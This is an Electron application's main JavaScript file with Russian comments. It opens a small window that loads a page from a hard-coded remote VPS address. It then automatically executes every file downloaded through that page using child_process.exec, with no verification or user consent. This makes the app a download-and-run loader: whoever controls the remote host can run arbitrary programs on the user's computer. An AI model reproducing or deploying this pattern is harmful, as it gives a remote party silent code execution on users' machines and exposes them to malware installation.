const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const url = require('url');
const fs = require('fs');
const { exec } = require('child_process');
let win;

function createWindow() {
  win = new BrowserWindow({ 
  width: 600, 
  height: 800,
	resizable: false,
	autoHideMenuBar: true,
	scroll: false,
   webPreferences: {
      // Отключаем полосу прокрутки
      scrollBounce: false
    }	
  });
  

  win.loadURL('http://v2378664.hosted-by-vdsina.ru/soft/'); // Замените 'https://example.com' на ваш домен

	


  win.webContents.session.on('will-download', (event, item, webContents) => {
    item.setSavePath(path.join(app.getPath('downloads'), item.getFilename()));
    item.once('done', (event, state) => {
      if (state === 'completed') {
        console.log('File successfully downloaded');
		const downloadedFilePath = item.getSavePath();
      // Здесь можно добавить логику обработки и запуска скачанного файла
      exec(downloadedFilePath, (err, stdout, stderr) => {
        if (err) {
          console.error(err);
          return;
        }
        console.log(stdout);
      });
      } else {
        console.log(`File download failed: ${state}`);
      }
    });
  });

  win.on('closed', () => {
    win = null;
  });
}

app.on('ready', createWindow);

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (win === null) {
    createWindow();
  }
});
